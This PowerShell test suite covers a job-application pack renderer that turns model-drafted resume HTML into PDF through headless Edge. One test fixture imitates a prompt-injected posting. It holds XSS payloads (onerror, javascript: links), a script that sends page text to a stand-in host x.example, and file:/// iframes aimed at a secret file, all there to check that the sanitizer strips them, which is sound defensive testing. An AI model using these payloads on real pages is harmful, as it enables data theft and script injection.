# Tests for the application pack flow (Idea I16): recipe definition, resume print template,
# pack-render station, headless Edge PDF generation with fake Edge, and tracker mutations.
$ErrorActionPreference = 'Stop'
$repo = (Resolve-Path (Join-Path $PSScriptRoot '..')).Path
$station = Join-Path $repo 'kitchen\stations\pack-render.ps1'
$template = Join-Path $repo 'kitchen\templates\resume.html'
$recipePath = Join-Path $repo 'kitchen\recipes\pack.json'

$root = Join-Path ([IO.Path]::GetTempPath()) ('kitchen-test-pack-' + [guid]::NewGuid().ToString('N'))
$career = Join-Path $root 'career'
$env:PASS_CAREER_DIR = $career

$script:pass = 0; $script:fail = 0
function Check($n, $c) { if ($c) { $script:pass++ } else { $script:fail++; Write-Host "FAIL: $n" } }

try {
    New-Item -ItemType Directory -Force -Path $root, $career, "$career\packs" | Out-Null

    # 1. Recipe and Template structure
    Check 'recipe file exists' (Test-Path -LiteralPath $recipePath -PathType Leaf)
    $rec = Get-Content -LiteralPath $recipePath -Raw | ConvertFrom-Json -AsHashtable
    Check 'recipe has description' ($rec.description -match 'pack|resume')
    Check 'recipe vars include appId, company, role, description, questions' ($rec.vars.appId.required -eq $true -and $rec.vars.ContainsKey('company') -and $rec.vars.ContainsKey('role') -and $rec.vars.ContainsKey('description') -and $rec.vars.ContainsKey('questions'))
    Check 'recipe has 3 steps (cook, taster, render)' (@($rec.steps).Count -eq 3)
    Check 'step 1 is private local agent' ($rec.steps[0].station -eq 'agent' -and $rec.steps[0].args.Private -eq $true -and $rec.steps[0].args.Supplier -eq 'local' -and $rec.steps[0].args.Model -eq 'qwen3.5:9b' -and $rec.steps[0].args.Tools -eq 'none')
    Check 'step 1 context includes canonical resume and claims to defend' ($rec.steps[0].args.Context -match '\{\{resume\}\}' -and $rec.steps[0].args.Context -match '\{\{claims\}\}')
    Check 'step 3 is pack-render station' ($rec.steps[2].station -eq 'pack-render' -and $rec.steps[2].args.AppId -match 'appId')

    # the draft path is absolute once cook.ps1 fills {{home}} (workers run in C:\Windows\System32), and taster and render read exactly what the cook saved
    Check 'step 1 saves the draft to an absolute path in the career packs folder' ([IO.Path]::IsPathRooted($rec.steps[0].args.SaveTo.Replace('{{home}}', [Environment]::GetFolderPath('UserProfile'))) -and $rec.steps[0].args.SaveTo -match '\\career\\packs\\\{\{appId\}\}-draft\.md$')
    Check 'step 2 is the tailor check on that draft (resume html + answers, against the resume)' ($rec.steps[1].station -eq 'tailor-check' -and $rec.steps[1].mustMatch -eq 'TAILOR-CHECK PASS' -and $rec.steps[1].args.Draft -eq $rec.steps[0].args.SaveTo -and $rec.steps[1].args.Sections -match 'resume html' -and $rec.steps[1].args.Resume -eq '{{resume}}' -and $rec.steps[1].args.Claims -eq '{{claims}}')
    Check 'step 3 renders the same draft' ($rec.steps[2].args.DraftFile -eq $rec.steps[0].args.SaveTo)

    Check 'resume template exists' (Test-Path -LiteralPath $template -PathType Leaf)
    $tplContent = Get-Content -LiteralPath $template -Raw -Encoding utf8
    Check "template carries a no-network CSP (default-src 'none')" ($tplContent -match "http-equiv=`"Content-Security-Policy`" content=`"default-src 'none';" -and $tplContent.IndexOf('Content-Security-Policy') -lt $tplContent.IndexOf('<style>'))
    Check 'template specifies letter page size and tight margins' ($tplContent -match '@page\s*\{\s*size:\s*letter;\s*margin:\s*0\.45in\s*0\.5in;')
    Check 'template contains print media query' ($tplContent -match '@media\s+print')
    Check 'template has body placeholder' ($tplContent -match '\{\{body\}\}')

    # 2. Fake Edge harness
    $fakeEdgeCmd = Join-Path $root 'fake-edge.cmd'
    $fakeEdgePs = Join-Path $root 'fake-edge.ps1'
    $fakeEdgeArgs = Join-Path $root 'fake-edge-args.txt'
    Set-Content -LiteralPath $fakeEdgeCmd -Value "@echo off`r`npwsh -NoProfile -ExecutionPolicy Bypass -File `"%~dp0fake-edge.ps1`" %*`r`nexit /b %ERRORLEVEL%`r`n" -Encoding ascii
    Set-Content -LiteralPath $fakeEdgePs -Value @"
`$argsStr = [Environment]::CommandLine   # the raw line: pwsh -File splits "--x=C:\..." at the colon
Set-Content -LiteralPath '$($fakeEdgeArgs.Replace("'", "''"))' -Value `$argsStr -Encoding utf8
if (`$env:FAKE_EDGE_FAIL -eq '1') { exit 1 }
# read the raw command line: pwsh -File splits "--print-to-pdf=C:\x.pdf" at the colon, so `$args cannot be trusted here
`$cl = [Environment]::CommandLine
if (`$cl -match '--print-to-pdf[= ]"?([A-Za-z]:\\[^"]+?\.pdf)') { Set-Content -LiteralPath `$Matches[1] -Value "%PDF-1.4 mock pdf binary stream" -Encoding utf8 }
exit 0
"@ -Encoding utf8

    $env:KITCHEN_EDGE_EXE = $fakeEdgeCmd

    # 3. Setup test tracker and draft
    $initTracker = @{
        updated = (Get-Date).ToUniversalTime().ToString('o')
        items = @(
            @{
                id = 'A1'
                company = 'Acme Corp'
                role = 'AI Operations Engineer'
                status = 'saved'
                savedAt = (Get-Date).ToUniversalTime().ToString('o')
            }
        )
    }
    Set-Content -LiteralPath (Join-Path $career 'tracker.json') -Value ($initTracker | ConvertTo-Json -Depth 5) -Encoding utf8

    $draftContent = @"
# Resume HTML
<header class="contact-header">
  <h1>Jordan West</h1>
  <div class="contact-info"><span>Springfield</span><span>jordan@example.com</span></div>
</header>
<section class="resume-section">
  <h2 class="section-title">Professional Summary</h2>
  <p class="summary-text">AI operations engineer with verified experience running local and private agent pipelines.</p>
</section>
<section class="resume-section">
  <h2 class="section-title">Core Skills</h2>
  <p class="skills-list">PowerShell, Node.js, Headless Automation, Agent Orchestration</p>
</section>
<section class="resume-section">
  <h2 class="section-title">Experience</h2>
  <div class="job-block">
    <div class="job-header"><span>Staff Operations Specialist</span><span>2024 - Present</span></div>
    <div class="job-sub"><span>Operations Lab</span><span>Springfield</span></div>
    <ul class="bullets">
      <li>Automated job pack generation with headless browser rendering.</li>
      <li>Maintained 100% test coverage across deterministic station workflows.</li>
    </ul>
  </div>
</section>

# Draft Answers
### 1. Why are you interested in Acme Corp?
Acme Corp solves mission-critical operations at scale, matching my background in reliable automation.

### 2. How do you handle production failures?
Through deterministic circuit breakers, bounded resource limits, and automated triage.


# Tailor check
- Keyword coverage: 80.0% (4 of 5 posting terms)
- Result: PASS
"@
    $draftPath = Join-Path $career 'packs\A1-draft.md'
    Set-Content -LiteralPath $draftPath -Value $draftContent -Encoding utf8

    # 4. Run pack-render.ps1
    & $station -AppId 'A1' -DraftFile "packs\A1-draft.md" 2>&1 | Out-Null
    Check 'pack-render exits 0 on success' ($LASTEXITCODE -eq 0)

    # Verify Fake Edge execution and arguments
    $argsLogged = Get-Content -LiteralPath (Join-Path $root 'fake-edge-args.txt') -Raw -ErrorAction SilentlyContinue
    Check 'fake edge received --headless' ($argsLogged -match '--headless')
    Check 'fake edge received --disable-gpu' ($argsLogged -match '--disable-gpu')
    Check 'fake edge received --no-pdf-header-footer' ($argsLogged -match '--no-pdf-header-footer')
    Check 'fake edge received --print-to-pdf' ($argsLogged -match '--print-to-pdf=.*A1-resume\.pdf')
    Check 'Edge prints with scripts off' ($argsLogged -match '--blink-settings=scriptEnabled=false')
    Check 'Edge uses a throwaway profile, removed afterwards' ($argsLogged -match '--user-data-dir=(\S+pack-edge-[0-9a-f]{32})' -and -not (Test-Path -LiteralPath $Matches[1]))
    Check 'Edge has no network (dead proxy, no extensions)' ($argsLogged -match '--proxy-server=http://127\.0\.0\.1:9' -and $argsLogged -match '--disable-extensions')
    Check 'answers leave out the tailor check card' ((Get-Content -LiteralPath (Join-Path $career 'packs\A1-answers.md') -Raw) -notmatch 'Tailor check')
    Check 'the rendered draft is moved aside (a later order that writes nothing cannot re-render it)' (-not (Test-Path -LiteralPath $draftPath) -and (Test-Path -LiteralPath (Join-Path $career 'packs\A1-draft.rendered.md')))
    Check 'tracker.json.bak kept and no lock left' ((Test-Path (Join-Path $career 'tracker.json.bak')) -and -not (Test-Path (Join-Path $career 'tracker.json.lock')))

    # Verify generated files
    $pdfPath = Join-Path $career 'packs\A1-resume.pdf'
    $htmlPath = Join-Path $career 'packs\A1-resume.html'
    $ansPath = Join-Path $career 'packs\A1-answers.md'
    Check 'output PDF created and non-zero' ((Test-Path -LiteralPath $pdfPath -PathType Leaf) -and ((Get-Item -LiteralPath $pdfPath -ErrorAction SilentlyContinue).Length -gt 0))
    Check 'output HTML created' (Test-Path -LiteralPath $htmlPath -PathType Leaf)
    Check 'output HTML wrapped in locked print template' ((Get-Content -LiteralPath $htmlPath -Raw) -match '@page\s*\{\s*size:\s*letter' -and (Get-Content -LiteralPath $htmlPath -Raw) -match 'Jordan West')
    Check 'output answers created with questions answered' ((Test-Path -LiteralPath $ansPath -PathType Leaf) -and (Get-Content -LiteralPath $ansPath -Raw) -match 'Acme Corp' -and (Get-Content -LiteralPath $ansPath -Raw) -match 'production failures')

    # Verify tracker updated
    $updatedTracker = Get-Content -LiteralPath (Join-Path $career 'tracker.json') -Raw | ConvertFrom-Json -AsHashtable
    $a1Item = @($updatedTracker.items | Where-Object { $_.id -eq 'A1' })[0]
    Check 'tracker.json has pack.ready = true' ($a1Item.pack.ready -eq $true)
    Check 'tracker.json has valid PDF and answers paths' ($a1Item.pack.pdf -eq 'packs/A1-resume.pdf' -and $a1Item.pack.answers -eq 'packs/A1-answers.md')

    # 5. Edge cases: missing draft file
    try {
        & $station -AppId 'A1' -DraftFile "packs\non-existent-draft.md" 2>&1 | Out-Null
        $code = $LASTEXITCODE
    } catch { $code = 1 }
    Check 'missing draft file exits non-zero' ($code -ne 0)

    # 6. Edge cases: Edge failure
    Set-Content -LiteralPath $draftPath -Value $draftContent -Encoding utf8
    $env:FAKE_EDGE_FAIL = '1'
    try {
        & $station -AppId 'A1' -DraftFile "packs\A1-draft.md" 2>&1 | Out-Null
        $failCode = $LASTEXITCODE
    } catch { $failCode = 1 }
    Check 'Edge failure causes pack-render to exit 1' ($failCode -eq 1)
    $env:FAKE_EDGE_FAIL = '0'

    # 7. Edge cases: malformed draft (raw html with code fences and no markdown headers)
    $rawDraft = '```html' + "`r`n" + '<header><h1>Fallback Resume</h1></header>' + "`r`n" + '```'
    Set-Content -LiteralPath (Join-Path $career 'packs\A2-draft.md') -Value $rawDraft -Encoding utf8
    $trackerWithA2 = @{
        updated = (Get-Date).ToUniversalTime().ToString('o')
        items = @(
            @{ id = 'A2'; company = 'Beta Inc'; role = 'Developer'; status = 'saved' }
        )
    }
    Set-Content -LiteralPath (Join-Path $career 'tracker.json') -Value ($trackerWithA2 | ConvertTo-Json -Depth 5) -Encoding utf8
    & $station -AppId 'A2' -DraftFile "packs\A2-draft.md" 2>&1 | Out-Null
    Check 'malformed/code-block draft succeeds' ($LASTEXITCODE -eq 0 -and (Test-Path (Join-Path $career 'packs\A2-resume.pdf')))
    # 7b. a reply with no Resume HTML section and no html block is not printed as the resume (it used to become a "ready" pack)
    Set-Content -LiteralPath (Join-Path $career 'packs\A2-draft.md') -Value "Sure! Jordan has 7+ years of experience leading teams.`n- Python`n- AWS" -Encoding utf8
    Remove-Item -LiteralPath (Join-Path $career 'packs\A2-resume.pdf') -ErrorAction SilentlyContinue
    & $station -AppId 'A2' -DraftFile "packs\A2-draft.md" 2>&1 | Out-Null
    Check 'no Resume HTML section: pack-render refuses (exit 1), no PDF' ($LASTEXITCODE -eq 1 -and -not (Test-Path (Join-Path $career 'packs\A2-resume.pdf')))
    # the cook step's output contract: the kitchen's taster sends back a reply without the Resume HTML section before render
    $mm = [string]$rec.steps[0].mustMatch
    Check 'cook step has an output contract (mustMatch) that a real draft meets' ($mm -and $draftContent -match $mm)
    Check 'the contract refuses a reply with no Resume HTML section' ("Sure! Here is a resume for Jordan.`n# Draft Answers`nI am great." -notmatch $mm -and "# Resume HTML`nJordan West, engineer" -notmatch $mm)

    # 8. hostile model HTML (a prompt-injected posting): nothing that can run, load or link out survives into the printed page
    $hostile = @'
# Resume HTML
<header class="contact-header" onclick="steal()"><h1 style="background:url(https://x.example/bg)">Jordan West</h1></header>
<script>new Image().src="https://x.example/?"+encodeURIComponent(document.body.innerText)</script>
<img src="https://x.example/p?d=1"><img src=x onerror=alert(1)>
<iframe src="file:///C:/Users/someone/secret.txt"></iframe><object data="file:///C:/x"></object>
<style>@import url(https://x.example/a.css)</style><link rel="stylesheet" href="https://x.example/b.css"><meta http-equiv="refresh" content="0;url=https://x.example">
<svg><script>alert(1)</script></svg><base href="https://x.example/">
<section class="resume-section"><p class="summary-text">Real summary text.</p><a href="https://x.example/track">site</a> <a href="javascript:alert(1)">js</a> <a href="mailto:jordan@example.com">mail</a></section>
<scr<script>ipt>alert(1)</script>
<p>trailing <b>bold</b> &lt;script&gt; stays text</p>
# Draft Answers
Fine.
'@
    Set-Content -LiteralPath (Join-Path $career 'packs\A3-draft.md') -Value $hostile -Encoding utf8
    & $station -AppId 'A3' -DraftFile 'packs\A3-draft.md' 2>&1 | Out-Null
    $out3 = Get-Content -LiteralPath (Join-Path $career 'packs\A3-resume.html') -Raw
    $body3 = $out3.Substring($out3.IndexOf('<body>'))
    Check 'hostile draft still renders' ($LASTEXITCODE -eq 0)
    Check 'no script, iframe, object, img, svg, link, meta, base or style survives' ($body3 -notmatch '(?i)<\s*(script|iframe|object|embed|img|svg|link|meta|base|style)\b')
    Check 'no on* handler, style attribute, src or web/file/javascript URL survives' ($body3 -notmatch '(?i)\son\w+\s*=|style=|\ssrc\s*=|https?:|file:|javascript:|url\(')
    Check 'layout tags, classes, text and mailto links are kept' ($body3 -match '<header class="contact-header">' -and $body3 -match '<p class="summary-text">Real summary text\.</p>' -and $body3 -match '<a href="mailto:jordan@example\.com">mail</a>' -and $body3 -match '<b>bold</b>' -and $body3 -match 'Jordan West')
    Check 'escaped text stays text' ($body3 -match '&lt;script&gt; stays text')

    # 9. a relative draft name never resolves against the current folder (System32 under the supervisor, the repo by hand)
    $cwdDir = Join-Path $root 'cwd'; New-Item -ItemType Directory -Force -Path "$cwdDir\packs" | Out-Null
    Set-Content -LiteralPath "$cwdDir\packs\A9-draft.md" -Value $draftContent -Encoding utf8
    Push-Location $cwdDir
    try { & $station -AppId 'A9' -DraftFile 'packs\A9-draft.md' 2>&1 | Out-Null; $cwdCode = $LASTEXITCODE } catch { $cwdCode = 1 } finally { Pop-Location }
    Check 'relative draft in the current folder is not used' ($cwdCode -ne 0 -and -not (Test-Path (Join-Path $career 'packs\A9-resume.pdf')))

    # 10. a draft that failed the tailor check is never rendered as a ready pack
    Set-Content -LiteralPath (Join-Path $career 'packs\A4-draft.md') -Value ($draftContent -replace 'Result: PASS', 'Result: FAIL') -Encoding utf8
    $o4 = & $station -AppId 'A4' -DraftFile 'packs\A4-draft.md' 2>&1 | Out-String
    Check 'failed tailor check: refused, no PDF' ($LASTEXITCODE -eq 1 -and $o4 -match 'failed the tailor check' -and -not (Test-Path (Join-Path $career 'packs\A4-resume.pdf')))

    # 11. an unreadable tracker is left byte-for-byte alone (the pack still renders; the row just isn't marked)
    $badT = '{ "items": [ { "id": "A2", "status": "applied" } ' + "`n<<<<<<< HEAD`n"
    [IO.File]::WriteAllText((Join-Path $career 'tracker.json'), $badT)
    Set-Content -LiteralPath (Join-Path $career 'packs\A2-draft.md') -Value $rawDraft -Encoding utf8
    $o5 = & $station -AppId 'A2' -DraftFile 'packs\A2-draft.md' 2>&1 | Out-String
    Check 'unreadable tracker: unchanged and warned' ([IO.File]::ReadAllText((Join-Path $career 'tracker.json')) -eq $badT -and $o5 -match 'failed to update tracker')

    # 12. agent-step refuses a relative SaveTo with no WorkDir (it would land in the worker's current folder)
    $o6 = & (Join-Path $repo 'kitchen\agent-step.ps1') -Prompt 'x' -SaveTo 'projects/career/packs/A1-draft.md' 2>&1 | Out-String
    Check 'agent-step: relative SaveTo refused with exit 2' ($LASTEXITCODE -eq 2 -and $o6 -match 'SaveTo must be an absolute path')
} catch {
    Write-Host "FAIL: unexpected exception in test: $_"
    $script:fail++
} finally {
    $env:PASS_CAREER_DIR = $null
    $env:KITCHEN_EDGE_EXE = $null
    $env:FAKE_EDGE_FAIL = $null
    Remove-Item -Recurse -Force -LiteralPath $root -ErrorAction SilentlyContinue
}

Write-Host "Pack tests: $($script:pass) passed, $($script:fail) failed"
exit ([int]($script:fail -gt 0))
